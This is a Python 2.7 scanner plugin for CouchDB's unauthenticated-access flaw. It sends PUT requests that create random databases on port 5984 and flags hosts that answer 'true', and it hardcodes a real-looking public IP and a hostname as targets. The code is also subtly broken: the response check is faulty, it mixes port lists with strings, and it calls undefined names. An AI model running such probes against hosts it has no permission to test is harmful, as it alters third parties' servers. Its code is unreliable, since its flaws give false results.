#!/usr/bin/python2.7
#coding:utf-8
#https://github.com/aipengjie/vulscans/blob/master/CouchDb.py

# -*- coding:utf-8 -*-
# !/usr/bin/env python
# http://drops.wooyun.org/papers/16030

import argparse
import requests
import traceback
import json
import urlparse
from gevent.threadpool import ThreadPool
import random

info = {
    'NAME':'CouchDB unauth Remote Command Execute',
    'AUTHOR':'c4bbage',
    'TIME':'20160521',
    'WEB':'http://drops.wooyun.org/papers/16030?utm_source=tuicool&utm_medium=referral',
    'DESCRIPTION':'CouchDB未授权访问漏洞执行任意系统命令'
}
opts = {
    'ip':'221.123.140.66',#target ip
    'ports':[5984],
}
class CouchDb():
    def __init__(self):
        self.pool = ThreadPool(10)
        self.result = []
        self.port = "5984"
        self.q = []
        self.randomstrs = ['a', 'k', 'b', 'v', 'd', 'f', 'e', 'g']
        self.path = '_utils/index.html'

    def Fuzz(self, info):
        try:
            url = info[0]
            port = info[1]
            host = urlparse.urlparse(url).netloc
            url = r'http://' + host + ":" + port
            rstr = "".join(random.sample(self.randomstrs, 5))
            url = url + r'/' + rstr
            try:
                print "Req::" + url
                r = requests.put(url, timeout=10)
                if 'ok' and 'true' in r.content:
                    self.result.append(info)
            except:
                pass
        except:
            pass

    def Scan(self, info):
        try:
            if isinstance(info, tuple):
                self.q.append(info)
            else:
                with open(file) as f:
                    content = json.loads(f.read())
                    for i in content:
                        self.q.append((i['url'], self.port))
            self.pool.map(self.Fuzz, self.q)
        except:
            traceback.print_exc()

# if __name__ == "__main__":
#     parse = argparse.ArgumentParser()
#     parse.add_argument("-u", "--url", dest="url")
#     parse.add_argument("-p", "--port", dest="port", default="5984")
#     parse.add_argument("-f", "--file", dest="file")
#     args = parse.parse_args()
#     url = args.url
#     port = args.port
#     file = args.file
#     info = (url, port) if url else file
#     exa = CouchDb()
#     exa.Scan(info)
#     if exa.result:
#         print "exsit vul"
#         print exa.result
        
def Assign(services):
	if services.has_key('ip') and services.has_key('ports'):
		if 5984 in services['ports']:
			if services.has_key('port_detail') and services['port_detail'][5984]['name'] != 'http':
				return False
			return True
	return False
def Audit(services):
    exa = CouchDb()
    exa.Scan((services['ip'],services['ports']))
    if exa.result:
        logger("coucdb_rce")
        url='http://' + services['ip'] + ':5984/'
        security_hole(url)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'ip':'d563a796147184245.jie.sangebaimao.com','ports':[5984]}
	pprint(Audit(services))